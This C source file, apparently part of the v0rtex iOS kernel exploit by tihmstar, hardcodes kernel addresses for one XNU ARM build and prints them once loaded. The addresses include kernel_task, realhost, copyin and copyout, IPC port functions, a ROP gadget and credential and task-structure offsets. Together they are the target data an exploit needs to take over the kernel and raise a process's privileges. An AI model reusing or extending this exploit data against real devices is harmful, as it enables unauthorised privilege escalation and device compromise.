//
//  offsetfinder.c
//  v0rtex
//
//  Created by tihmstar on 20.12.17.
//  Copyright © 2017 tihmstar. All rights reserved.
//

#include "offsetfinder.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#define dprintf printf
#define dstrcmp strcmp

t_offsets *guoffsets = NULL;

//typedef struct{
//    uint32_t offset_zone_map;
//    uint32_t offset_kernel_map;
//    uint32_t offset_kernel_task;
//    uint32_t offset_realhost;
//    uint32_t offset_bzero;
//    uint32_t offset_bcopy;
//    uint32_t offset_copyin;
//    uint32_t offset_copyout;
//    uint32_t offset_ipc_port_alloc_special;
//    uint32_t offset_ipc_kobject_set;
//    uint32_t offset_ipc_port_make_send;
//    uint32_t offset_rop_ldr_r0_r0_0xc;
//    uint32_t offset_chgproccnt;
//    uint32_t offset_kauth_cred_ref;
//    uint32_t offset_OSSerializer_serialize;
//    uint32_t offset_ipc_space_is_task;
//    uint32_t offset_task_itk_self;
//    uint32_t offset_task_itk_registered;
//    uint32_t offset_vtab_get_external_trap_for_index;
//    uint32_t offset_iouserclient_ipc;
//    uint32_t offset_proc_ucred;
//    uint32_t offset_task_bsd_info;
//    uint32_t offset_sizeof_task;
//}t_offsets;

t_offsets *info_to_target_environment(char *uname) {
    guoffsets = NULL;
    t_offsets uoffsets;
    int pushing = 0;
#define pushOffset(off) *(((uint32_t*)&uoffsets)+(pushing++)) = (off)
    if (!dstrcmp(uname, "Darwin Kernel Version 17.2.0: Fri Sep 29 18:03:18 PDT 2017; root:xnu-4570.20.62~2/RELEASE_ARM_T8004")){
        pushOffset(0x80476220); //zone_map
        pushOffset(0x804ac034); //kernel_map
        pushOffset(0x804ac030); //kernel_task
        pushOffset(0x804611b0); //realhost
        pushOffset(0x80009168); //bzero
        pushOffset(0x80008e1d); //bcopy
        pushOffset(0x80007a64); //copyin
        pushOffset(0x80007b4c); //copyout
        pushOffset(0x8001a1ab); //ipc_port_alloc_special
        pushOffset(0x8002c399); //ipc_kobject_set
        pushOffset(0x80019d59); //ipc_port_make_send
        pushOffset(0x801160b9); //rop_ldr_r0_r0_0xc
        pushOffset(0x8029b979); //chgproccnt
        pushOffset(0x8027b03b); //kauth_cred_ref
        pushOffset(0x80346345); //OSSerializer_serialize
        pushOffset(0x00000018); //ipc_space_is_task
        pushOffset(0x000000a4); //task_itk_self
        pushOffset(0x000001e4); //task_itk_registered
        pushOffset(0x000000e1); //vtab_get_external_trap_for_index
        pushOffset(0x00000060); //iouserclient_ipc
        pushOffset(0x00000090); //proc_ucred
        pushOffset(0x00000238); //task_bsd_info
        pushOffset(0x000003d8); //sizeof_task
    }
    else{
        dprintf("[!] Failed to load offsets\n");
        return NULL;
    }
    
    guoffsets = malloc(sizeof(t_offsets));
    memcpy(guoffsets,&uoffsets,sizeof(t_offsets));
    
    dprintf("[*] Loaded offsets:\n");
    dprintf("    0x%x -offset_zone_map\n",uoffsets.offset_zone_map);
    dprintf("    0x%x -offset_kernel_map\n",uoffsets.offset_kernel_map);
    dprintf("    0x%x -offset_kernel_task\n",uoffsets.offset_kernel_task);
    dprintf("    0x%x -offset_realhost\n",uoffsets.offset_realhost);
    dprintf("    0x%x -offset_bzero\n",uoffsets.offset_bzero);
    dprintf("    0x%x -offset_bcopy\n",uoffsets.offset_bcopy);
    dprintf("    0x%x -offset_copyin\n",uoffsets.offset_copyin);
    dprintf("    0x%x -offset_copyout\n",uoffsets.offset_copyout);
    dprintf("    0x%x -offset_ipc_port_alloc_special\n",uoffsets.offset_ipc_port_alloc_special);
    dprintf("    0x%x -offset_ipc_kobject_set\n",uoffsets.offset_ipc_kobject_set);
    dprintf("    0x%x -offset_ipc_port_make_send\n",uoffsets.offset_ipc_port_make_send);
    dprintf("    0x%x -offset_rop_ldr_r0_r0_0xc\n",uoffsets.offset_rop_ldr_r0_r0_0xc);
    dprintf("    0x%x -offset_chgproccnt\n",uoffsets.offset_chgproccnt);
    dprintf("    0x%x -offset_kauth_cred_ref\n",uoffsets.offset_kauth_cred_ref);
    dprintf("    0x%x -offset_OSSerializer_serialize\n",uoffsets.offset_OSSerializer_serialize);
    dprintf("    0x%x -offset_ipc_space_is_task\n",uoffsets.offset_ipc_space_is_task);
    dprintf("    0x%x -offset_task_itk_self\n",uoffsets.offset_task_itk_self);
    dprintf("    0x%x -offset_task_itk_registered\n",uoffsets.offset_task_itk_registered);
    dprintf("    0x%x -offset_vtab_get_external_trap_for_index\n",uoffsets.offset_vtab_get_external_trap_for_index);
    dprintf("    0x%x -offset_iouserclient_ipc\n",uoffsets.offset_iouserclient_ipc);
    dprintf("    0x%x -offset_proc_ucred\n",uoffsets.offset_proc_ucred);
    dprintf("    0x%x -offset_task_bsd_info\n",uoffsets.offset_task_bsd_info);
    dprintf("    0x%x -offset_sizeof_task\n",uoffsets.offset_sizeof_task);
    
    return guoffsets;
}
